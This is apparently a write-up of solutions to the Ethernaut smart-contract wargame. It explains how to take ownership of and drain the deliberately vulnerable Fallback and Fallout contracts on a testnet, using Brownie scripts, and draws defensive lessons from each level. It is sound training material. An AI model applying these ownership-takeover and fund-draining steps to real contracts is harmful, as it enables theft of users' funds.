# Ethernaut
## Setting up Environment
I used Brownie for my development environment. All soltuions are implemented as scripts in `/scripts` 
You will need to obtain an archive URL from Alchemy and create a new development network.
```
brownie networks add development rinkeby-fork cmd=ganache-cli host=http://127.0.0.1 fork=**ARCHIVE URL** accounts=10 mnemonic=brownie port=8545
```
### Running scripts
First I ran my scripts locally to test my solutions. Then I ran my scripts live on Rinkeby to pass the levels.
```
# run scripts locally
brownie run scripts\fallout.py --network rinkeby-fork
# run scripts live on Rinkeby
brownie run scripts\fallout.py --network rinkeby
```
## Level 1: Fallback
To beat this level we must claim ownership of the contract and then drain it. We need to become the owner and then we can call `withdraw()`, which has a modifier that only allows the current owner to call the function. 
There are two places where the owner variable can be modified:
1. In the contribute function
```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```
2. In the fallback function
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```
The contribute function only lets us send less than 0.001 ether at a time and the owner variable gets modified only when our contributions are greater than the contributions of the current owner. The contributions of the current owner have been set to 1000 ether in the constructor:
```solidity
constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }
```
Therefore, this method is not practical. Now we know that we need to trigger the fallback function in order to set ourselves as the owner.
The require statment in the fallback function checks that our transaction has a value greater than 0 and that our contributions are also greater than 0. We will need to call `contribute()` with an arbitrarily small amount of ether (at least less than 0.001) to satisfy this check.
```python
eth_amount = Web3.toWei("0.00001", "ether")
fallback.contribute({"from": account, "value": eth_amount}) 
```
Once we have called contribute we are now ready to trigger the fallback function. To do this we will execute a simple ether transfer to the contract. We can do this very easily with brownie:
```
account.transfer(fallback, "0.00001 ether")
```
We can check that we are now the owner of the contract:
```python
print(fallback.owner() == account.address)
```
All that is left to do is drain the contract. We will do this by calling `withdraw()`. We will pass the check in the `onlyOwner` modifier since we are now the current owner.
```python
fallback.withdraw({"from": account})
```
We have now successfully passed the level! 
This level shows us that anyone is able to call the fallback function of a contract and execute any code that is in said fallback function. Moral of the story: Be wary of putting code that modifiers sensitive state variables in your fallback function. 

## Level 2: Fallout
To pass this level we need to claim ownership of the contract. We can see that the owner variable only gets modified once in the constructor:
```solidity
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```
We can see that this constructor does not use the `constructor` keyword. Therefore, the name of the constructor function must match the name of the contract in order to be executed as a constructor. 
Note that since `Solidity v0.4.22` this method is now deprecated. Since this contract does not use the `constructor` keyword, the Fal1out function can be seen as any normal function. We can then call this function and become the owner of the contract.
```python
fallout.Fal1out({"from": account})
```
Now we can check that we are the owner of the contract:
```python
print(fallout.owner() == account.address)
```
We have successfully passed this level!
Moral of the story: Use the `constructor` keyword.

